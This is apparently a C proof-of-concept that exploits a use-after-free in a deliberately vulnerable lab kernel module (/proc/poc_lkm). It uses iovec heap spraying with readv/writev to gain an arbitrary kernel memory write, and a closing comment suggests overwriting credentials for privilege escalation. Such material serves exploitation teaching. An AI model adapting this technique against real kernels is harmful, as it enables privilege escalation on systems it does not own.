#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>
#include <limits.h>
#include <syscall.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <net/if.h>
#include <sys/uio.h>

/* Ubuntu kernel 4.4.0-128 */

// We have to use iov count bigger than UIO_FASTIOV, for allocating iovecs in heap.
#define UIO_FASTIOV       8
#define UIO_MAXIOV        1024
#define UIO_IOV_COUNT	  10
#define NPROC 256

struct poc_lkm_size {
	char dummy[128];
};
struct poc_lkm_object {
	unsigned long a1[UIO_IOV_COUNT];
	unsigned long a2[UIO_IOV_COUNT];
};

// Construct Use-After-Free with combination of below commands
#define POC_LKM_IOCTL_MAGIC ('P')
#define POC_LKM_CMD_0 _IOWR(POC_LKM_IOCTL_MAGIC, 0, struct poc_lkm_size)	/* Allocate */
#define POC_LKM_CMD_1 _IOWR(POC_LKM_IOCTL_MAGIC, 1, struct poc_lkm_size)	/* Generate 2nd reference */
#define POC_LKM_CMD_2 _IOWR(POC_LKM_IOCTL_MAGIC, 2, struct poc_lkm_size)	/* Free */
#define POC_LKM_CMD_3 _IOWR(POC_LKM_IOCTL_MAGIC, 3, struct poc_lkm_size)	/* Use (Write) */
#define POC_LKM_CMD_4 _IOWR(POC_LKM_IOCTL_MAGIC, 4, struct poc_lkm_size)	/* Print poc_lkm_str */

int fd;
unsigned long target_kernel_addr = 0x00;

// allocate object & generate 2nd reference & free
int alloc_gen_free(void)
{
	int r, i;
	struct poc_lkm_object uaf_object;

	memset(&uaf_object, 0x70, sizeof(uaf_object));

	r = ioctl(fd, POC_LKM_CMD_0, &uaf_object);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_0 failed\n");
		return -1;
	}

	r = ioctl(fd, POC_LKM_CMD_1, &uaf_object);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_1 failed\n");
		return -1;
	}

	r = ioctl(fd, POC_LKM_CMD_2, &uaf_object);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_2 failed\n");
		return -1;
	}

	return 0;
}

void init_uaf_object(struct poc_lkm_object *obj)
{
	int i;
	
	for (i=0; i<UIO_IOV_COUNT; i++) {
		if (i%2 == 0) {
			obj->a1[i] = target_kernel_addr;
			obj->a2[i] = target_kernel_addr;
		} else {
			obj->a1[i] = sizeof(unsigned long);
			obj->a2[i] = sizeof(unsigned long);
		}
	}
}

int uaf_write(void)
{
	int r;
	struct poc_lkm_object uaf_object;

	init_uaf_object(&uaf_object);

	r = ioctl(fd, POC_LKM_CMD_3, &uaf_object);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_3 failed. attack failed.. please retry!!\n");
		return -1;
	}

	return 0;
}

void print_poc_lkm_str(void)
{
	int r;
	unsigned long arg;

	r = ioctl(fd, POC_LKM_CMD_4, &arg);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_4 failed\n");
		return -1;
	}
}

void init_iov(struct iovec *iov, unsigned int cnt, char *buf, unsigned int len)
{
	int i;
	
	for (i=0; i<cnt; i++) {
		iov[i].iov_base = (void *)buf;
		iov[i].iov_len = len;
	}
}

int pipefds[2 * NPROC];
volatile int read_flag = 0;

void *pipe_uaf_reader(void *arg)
{
	struct iovec read_iov[UIO_IOV_COUNT];
	unsigned long read_buf = 0x03;
	int read_fd = (int)arg * 2;

	while (read_flag == 0)
		;	// into busy loop. It's helpful for exploitation possibility.

	init_iov(&read_iov, UIO_IOV_COUNT, &read_buf, sizeof(read_buf));

	readv(pipefds[read_fd], read_iov, UIO_IOV_COUNT);
	return NULL;
}

void pipe_uaf_writer(void)
{
	struct iovec write_iov[UIO_IOV_COUNT];
	char write_buf[64] = "AttackWorld";
	int i;

	init_iov(&write_iov, UIO_IOV_COUNT, write_buf, strlen(write_buf) + 1);
	uaf_write();

	for (i=0; i<NPROC; i++)
		writev(pipefds[i * 2 + 1], write_iov, UIO_IOV_COUNT);
	printf("end - writev\n");
}

void init_pipefds(void)
{
	int i;

	for (i=0; i<NPROC; i++) {
		if (pipe(&pipefds[i * 2])) {
			printf("pipe error\n");
			exit(0);
		}
	}
}

int main(int argc, char **argv)
{
	int r, i;
	char *stop;
	pthread_t threads[NPROC];

	if (argc != 2) {
		printf("USAGE: ./poc <target kernel address>\n");
		return -1;
	}

	target_kernel_addr = strtoul(argv[1], &stop, 16);
	printf("target kernel address : %lx\n", target_kernel_addr);

	fd = open("/proc/poc_lkm", O_RDWR);
	if (fd < 0) {
		printf("[-] open /proc/poc_lkm failed\n");
		return 0;
	}
	
	init_pipefds();

	print_poc_lkm_str();

	// 1. create multiple threads 
	for (i=0; i<NPROC; i++) {
		r = pthread_create(&threads[i], NULL, pipe_uaf_reader, (void *)i);
		if (r) {
			printf("pthread_create error\n");
			goto out;
		}
	}

	// 2. allocate & generate 2nd reference & free
	alloc_gen_free();

	// 3. Trigger multiple readv which is spraying heaps to increase the possibility of exploitation.
	read_flag = 1;

	// 4. UAF write. This modifies address of iovec, from user address to target_kernel_addr.
	// and next, trigger writev to do kernel memory write!!
	sleep(5);
	pipe_uaf_writer();

	print_poc_lkm_str();	// If attack succeed, kernel prints "AttackWorld". If not, prints "HellooWorld"

	// 4. clean-up threads
	for (i=0; i<NPROC; i++) {
		r = pthread_join(threads[i], NULL);
		if (r) {
			printf("pthread_join error\n");
		}
	}

	// If you want to do privilege escalation, overwrite process credential with this ability!!

out:
	close(fd);
	for (i=0; i<NPROC*2; i++)
		close(pipefds[i]);
	return 0;
}
